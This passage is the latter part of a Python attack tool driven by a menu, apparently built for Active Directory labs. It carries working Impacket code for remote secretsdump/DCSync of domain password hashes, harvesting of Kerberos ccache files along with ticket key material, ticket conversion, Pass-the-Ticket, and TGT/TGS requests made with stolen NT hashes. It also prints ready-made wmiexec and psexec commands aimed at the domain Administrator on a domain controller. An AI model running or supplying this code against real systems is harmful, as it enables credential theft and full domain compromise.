    print(f"    {C}[4]{W} ptt      — Pass-the-Ticket{RS}")
    print(f"    {C}[5]{W} request  — Request fresh TGT/TGS{RS}")

    choice = safe_input(f"\n  Choice: {RS}")
    if choice is None:
        return

    if choice == "1":
        creds = get_creds()
        if creds[0] is None:
            return
        username, password, nt_hash, ccache = creds
        technique_remote_dump(dc_ip, domain, username, password, nt_hash)
    elif choice == "2":
        technique_parse_ccache(domain)
    elif choice == "3":
        technique_convert()
    elif choice == "4":
        technique_ptt(dc_ip, domain)
    elif choice == "5":
        technique_request(dc_ip, domain)
    else:
        print(f"{R}[!] Invalid choice{RS}")


def technique_remote_dump(target, domain, username, password, nt_hash):
    if not IMPACKET_AVAILABLE:
        print(f"{R}[!] Impacket not available.{RS}")
        return

    print(f"\n{C}{BO}[ TECHNIQUE 9a: Remote secretsdump ]{RS}")
    print(f"  {Y}Flow: SMB auth → DRSUAPI/SAMR/WINREG → hash extraction{RS}\n")

    lm_hash = "aad3b435b51404eeaad3b435b51404ee" if nt_hash else ""

    print(f"  {B}[*] Connecting to {target} via SMB...{RS}")
    try:
        smb_conn = SMBConnection(target, target, sess_port=445, timeout=10)
        smb_conn.login(username, password, domain, lm_hash, nt_hash)
        print(f"  {G}  [+] SMB authenticated as {username}@{domain}{RS}")
    except Exception as e:
        error_msg = str(e).lower()
        if "logon failure" in error_msg:
            print(f"  {R}  [!] SMB auth failed: Wrong credentials{RS}")
        elif "timeout" in error_msg:
            print(f"  {R}  [!] SMB auth failed: Connection timeout (wrong IP?){RS}")
        elif "name or service not known" in error_msg:
            print(f"  {R}  [!] SMB auth failed: Cannot resolve target (wrong domain?){RS}")
        else:
            print(f"  {R}  [!] SMB auth failed: {e}{RS}")
        return

    print(f"\n  {B}[*] Setting up remote operations...{RS}")
    try:
        remote_ops = RemoteOperations(smb_conn, False)
        remote_ops.enableRegistry()
        print(f"  {G}  [+] Remote registry enabled{RS}")
    except Exception as e:
        print(f"  {R}  [!] RemoteOperations failed: {e}{RS}")
        smb_conn.close()
        return

    try:
        boot_key = remote_ops.getBootKey()
        print(f"  {G}  [+] Boot key: {hexlify(boot_key).decode()}{RS}")
    except Exception as e:
        print(f"  {Y}  [~] SAM: {e}{RS}")
        boot_key = None

    print(f"\n  {B}[*] Attempting DCSync (DRSUAPI)...{RS}")
    try:
        ntds = NTDSHashes(
            None, boot_key,
            isRemote=True, history=False, noLMHash=True,
            remoteOps=remote_ops, useVSSMethod=False,
            justNTLM=False, pwdLastSet=False,
            resumeSession=None, outputFileName=None,
            justUser=None, printUserStatus=False
        )

        print(f"\n  {G}{BO}[ DOMAIN HASHES ]{RS}")
        print(f"  {'─'*60}")

        ntds.dump()
        ntds.finish()
        print(f"  {'─'*60}")

    except Exception as e:
        print(f"  {Y}  [~] DCSync not available: {e}{RS}")

    try:
        remote_ops.finish()
    except:
        pass
    smb_conn.close()


def technique_parse_ccache(domain):
    if not IMPACKET_AVAILABLE:
        print(f"{R}[!] Impacket not available.{RS}")
        return

    print(f"\n{C}{BO}[ TECHNIQUE 9b: Parse .ccache Files ]{RS}")

    print(f"\n  {W}Scan dir or single file? {C}[1=dir / 2=file]{W}: {RS}", end="")
    ch = safe_input("")
    if ch is None:
        return

    if ch == "2":
        ccache_file = safe_input(f"  {W}File path: {RS}")
        if ccache_file is None:
            return
        files = [ccache_file] if os.path.exists(ccache_file) else []
    else:
        ccache_dir = safe_input(f"  {W}Directory to scan {C}[/tmp]{W}: {RS}")
        if ccache_dir is None:
            return
        ccache_dir = ccache_dir or "/tmp"
        patterns = [
            os.path.join(ccache_dir, "krb5cc_*"),
            os.path.join(ccache_dir, "*.ccache"),
        ]
        files = []
        for pat in patterns:
            files.extend(glob.glob(pat))
        env_cache = os.environ.get('KRB5CCNAME', '')
        if env_cache and env_cache not in files and os.path.exists(env_cache):
            files.append(env_cache)

    if not files:
        print(f"  {Y}[~] No .ccache files found{RS}")
        print(f"  {Y}    Generate one first with option [5] Request TGT{RS}")
        return

    print(f"\n  {G}[+] Found {len(files)} ccache file(s){RS}\n")
    all_tickets = []

    for filepath in files:
        print(f"  {W}{BO}[ {filepath} ]{RS}")
        try:
            cc = CCache.loadFile(filepath)
        except Exception as e:
            print(f"  {R}  [!] Could not parse: {e}{RS}\n")
            continue

        try:
            print(f"  {C}  Owner: {cc.principal.prettyPrint()}{RS}")
        except:
            print(f"  {C}  Owner: (unknown){RS}")

        print(f"  {'─'*55}")
        print(f"  {'SERVICE':<40} {'EXPIRES':<20} TYPE")
        print(f"  {'─'*55}")

        for cred in cc.credentials:
            try:
                server = cred['server'].prettyPrint()
                try:
                    endtime = KerberosTime.fromASN1(cred['time']['endtime'])
                    now     = datetime.now(timezone.utc)
                    expired = endtime < now
                    exp_str = endtime.strftime("%Y-%m-%d %H:%M")
                    exp_col = R if expired else G
                    exp_tag = " [EXPIRED]" if expired else ""
                except:
                    exp_str, exp_col, exp_tag = "unknown", Y, ""

                is_tgt = 'krbtgt' in server.lower()
                ttype  = f"{Y}TGT{RS}" if is_tgt else f"{B}TGS{RS}"

                print(f"  {W}{server:<40}{RS} {exp_col}{exp_str}{exp_tag}{RS:<10} {ttype}")

                try:
                    keytype    = int(cred['key']['keytype'])
                    keydata    = bytes(cred['key']['keyvalue'])
                    etype_name = {17:"AES128",18:"AES256",23:"RC4-HMAC"}.get(keytype, f"etype-{keytype}")
                    print(f"    {C}Key: {etype_name} | {hexlify(keydata).decode()[:32]}...{RS}")
                except:
                    pass

                all_tickets.append({'file': filepath, 'server': server, 'is_tgt': is_tgt})
            except Exception as e:
                print(f"  {R}  Error: {e}{RS}")
        print()

    tgts = [t for t in all_tickets if t['is_tgt']]
    print(f"  {G}{BO}Summary: {len(tgts)} TGT(s) | {len(all_tickets)-len(tgts)} TGS(s){RS}")

    if tgts:
        dc_fqdn = f"CS-DC01.{domain}"
        print(f"\n  {C}Use a TGT:{RS}")
        for t in tgts[:2]:
            print(f"  {W}  export KRB5CCNAME={t['file']}{RS}")
            print(f"  {W}  python3 wmiexec.py -k -no-pass {domain}/Administrator@{dc_fqdn}{RS}")


def technique_convert():
    if not IMPACKET_AVAILABLE:
        print(f"{R}[!] Impacket not available.{RS}")
        return

    print(f"\n{C}{BO}[ TECHNIQUE 9c: Ticket Format Conversion ]{RS}")
    print(f"  {Y}  .kirbi = Windows (Mimikatz/Rubeus){RS}")
    print(f"  {Y}  .ccache = Linux (impacket){RS}\n")

    input_file  = safe_input(f"  {W}Input file  (.kirbi or .ccache): {RS}")
    if input_file is None:
        return
    output_file = safe_input(f"  {W}Output file (.ccache or .kirbi): {RS}")
    if output_file is None:
        return

    if not os.path.exists(input_file):
        print(f"  {R}[!] File not found: {input_file}{RS}")
        return

    ext_in  = input_file.lower().split('.')[-1]
    ext_out = output_file.lower().split('.')[-1]

    if ext_in in ('kirbi', 'bin') and ext_out == 'ccache':
        try:
            with open(input_file, 'rb') as f:
                data = f.read()
            try:
                import base64
                data = base64.b64decode(data)
                print(f"  {Y}  (base64 decoded){RS}")
            except:
                pass
            cc = CCache()
            cc.fromKirbi(data)
            cc.saveFile(output_file)
            print(f"  {G}[+] Saved: {output_file}{RS}")
            print(f"  {W}  export KRB5CCNAME={output_file}{RS}")
        except Exception as e:
            print(f"  {R}[!] Failed: {e}{RS}")

    elif ext_in == 'ccache' and ext_out in ('kirbi', 'bin'):
        try:
            import base64
            cc    = CCache.loadFile(input_file)
            kirbi = cc.toKirbi()
            with open(output_file, 'wb') as f:
                f.write(kirbi)
            b64 = base64.b64encode(kirbi).decode()
            print(f"  {G}[+] Saved: {output_file}{RS}")
            print(f"  {C}Base64 for Rubeus:{RS}")
            print(f"  {Y}  {b64[:80]}...{RS}")
        except Exception as e:
            print(f"  {R}[!] Failed: {e}{RS}")
    else:
        print(f"  {R}[!] Unsupported: {ext_in} → {ext_out}{RS}")
        print(f"      Use: .kirbi → .ccache  or  .ccache → .kirbi")


def technique_ptt(target, domain):
    if not IMPACKET_AVAILABLE:
        print(f"{R}[!] Impacket not available.{RS}")
        return

    print(f"\n{C}{BO}[ TECHNIQUE 9d: Pass-the-Ticket ]{RS}")

    ccache_file = safe_input(f"  {W}.ccache file path: {RS}")
    if ccache_file is None:
        return
    username    = safe_input(f"  {W}Username {C}[Administrator]{W}: {RS}")
    if username is None:
        return
    username = username or "Administrator"

    if not os.path.exists(ccache_file):
        print(f"  {R}[!] File not found: {ccache_file}{RS}")
        return

    print(f"\n  {B}[*] Inspecting ticket...{RS}")
    try:
        cc = CCache.loadFile(ccache_file)
        for cred in cc.credentials:
            try:
                print(f"  {G}  ✓ {cred['server'].prettyPrint()}{RS}")
            except:
                pass
    except Exception as e:
        print(f"  {R}[!] Failed to read: {e}{RS}")
        return

    os.environ['KRB5CCNAME'] = ccache_file
    print(f"\n  {G}[+] KRB5CCNAME set → {ccache_file}{RS}")

    print(f"\n  {B}[*] Testing SMB with ticket...{RS}")
    try:
        smb_conn = SMBConnection(target, target, sess_port=445, timeout=10)
        smb_conn.kerberosLogin(username, "", domain, "", "", "", kdcHost=target)
        print(f"  {G}[+] SMB authenticated via Kerberos!{RS}")
        shares = smb_conn.listShares()
        for s in shares:
            print(f"    {W}  {s['shi1_netname'][:-1]}{RS}")
        smb_conn.close()
    except Exception as e:
        print(f"  {R}[!] SMB failed: {e}{RS}")
        print(f"  {Y}    Use FQDN not IP for Kerberos auth{RS}")

    dc_fqdn = f"CS-DC01.{domain}"
    print(f"\n  {C}Commands to use this ticket:{RS}")
    print(f"  {W}  export KRB5CCNAME={ccache_file}{RS}")
    print(f"  {W}  python3 wmiexec.py   -k -no-pass {domain}/{username}@{dc_fqdn}{RS}")
    print(f"  {W}  python3 smbclient.py -k -no-pass {domain}/{username}@{dc_fqdn}{RS}")
    print(f"  {W}  python3 psexec.py    -k -no-pass {domain}/{username}@{dc_fqdn}{RS}")


def technique_request(target, domain):
    if not IMPACKET_AVAILABLE:
        print(f"{R}[!] Impacket not available.{RS}")
        return

    print(f"\n{C}{BO}[ TECHNIQUE 9e: Request Fresh Ticket ]{RS}")

    creds = get_creds()
    if creds[0] is None:
        return
    username, password, nt_hash, ccache = creds

    spn = safe_input(f"  {W}Target SPN (optional, press Enter to skip): {RS}")
    if spn is None:
        return

    lm_hash        = "aad3b435b51404eeaad3b435b51404ee" if nt_hash else ""
    user_principal = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

    print(f"\n  {B}[*] Requesting TGT for {username}@{domain.upper()}...{RS}")
    try:
        if nt_hash:
            tgt, cipher, old_sk, sk = getKerberosTGT(
                clientName=user_principal, password="", domain=domain,
                lmhash=bytes.fromhex(lm_hash), nthash=bytes.fromhex(nt_hash),
                aesKey="", kdcHost=target
            )
        else:
            tgt, cipher, old_sk, sk = getKerberosTGT(
                clientName=user_principal, password=password, domain=domain,
                lmhash=b"", nthash=b"", aesKey="", kdcHost=target
            )
        print(f"  {G}  [+] TGT obtained!{RS}")
    except Exception as e:
        error_msg = str(e).lower()
        if "preauthentication" in error_msg or "preauth" in error_msg:
            print(f"  {R}  [!] TGT failed: Pre-authentication failed (wrong password/hash){RS}")
        elif "client not found" in error_msg:
            print(f"  {R}  [!] TGT failed: User '{username}' not found in domain '{domain}'{RS}")
        elif "cannot contact" in error_msg or "kdc" in error_msg:
            print(f"  {R}  [!] TGT failed: Cannot contact KDC at {target} (wrong IP?){RS}")
        elif "timeout" in error_msg:
            print(f"  {R}  [!] TGT failed: Connection timeout (wrong IP?){RS}")
        else:
            print(f"  {R}  [!] TGT failed: {e}{RS}")
        return

    outfile = f"{username}_tgt.ccache"
    cc = CCache()
    cc.fromTGT(tgt, old_sk, sk)
    cc.saveFile(outfile)
    print(f"  {G}  [+] Saved: {outfile}{RS}")

    if spn:
        print(f"\n  {B}[*] Requesting TGS for {spn}...{RS}")
        try:
            server     = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
            tgs, c2, o2, s2 = getKerberosTGS(
                serverName=server, domain=domain, kdcHost=target,
                tgt=tgt, cipher=cipher, sessionKey=sk
            )
            tgs_file = f"{username}_{spn.replace('/','_')}.ccache"
            cc2 = CCache()
            cc2.fromTGS(tgs, o2, s2)
            cc2.saveFile(tgs_file)
            print(f"  {G}  [+] TGS saved: {tgs_file}{RS}")
        except Exception as e:
            print(f"  {R}  [!] TGS failed: {e}{RS}")

    print(f"\n  {C}Use it:{RS}")
    print(f"  {W}  export KRB5CCNAME={outfile}{RS}")


# ─────────────────────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────────────────────
def main():
    try:
        dc_ip, domain = get_config()
        if dc_ip is None or domain is None:
            print(f"\n{Y}[!] Configuration cancelled.{RS}")
            sys.exit(0)

        while True:
            if INTERRUPTED:
                break

            choice = show_menu()
            if choice is None:
                continue

            if choice == "0":
                print(f"\n  {Y}Bye!{RS}\n")
                break

            if choice in ("1", "2", "3", "4", "5", "6", "7", "8"):
                creds = get_creds()
                if creds[0] is None:
                    continue
                username, password, nt_hash, ccache = creds

            if choice == "1":
                technique_adminto(dc_ip, domain, username, password, nt_hash, ccache)
            elif choice == "2":
                technique_canrdp(dc_ip, domain, username, password, nt_hash)
            elif choice == "3":
                technique_canpsremote(dc_ip, domain, username, password, nt_hash)
            elif choice == "4":
                technique_executedcom(dc_ip, domain, username, password, nt_hash)
            elif choice == "5":
                technique_sqladmin(dc_ip, domain, username, password, nt_hash)
            elif choice == "6":
                technique_hassession(dc_ip, domain, username, password, nt_hash)
            elif choice == "7":
                technique_remoteinteractive(dc_ip, domain, username, password, nt_hash)
            elif choice == "8":
                technique_claimspecial(dc_ip, domain, username, password, nt_hash)
            elif choice == "9":
                technique_kerberos_menu(dc_ip, domain)
            else:
                print(f"  {R}Invalid choice{RS}")

            try:
                safe_input(f"\n  {Y}Press Enter to return to menu...{RS}")
            except:
                pass

    except KeyboardInterrupt:
        print(f"\n\n{Y}[!] Interrupted by user. Exiting...{RS}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{R}[!] Fatal error: {e}{RS}")
        sys.exit(1)


if __name__ == "__main__":
    main()
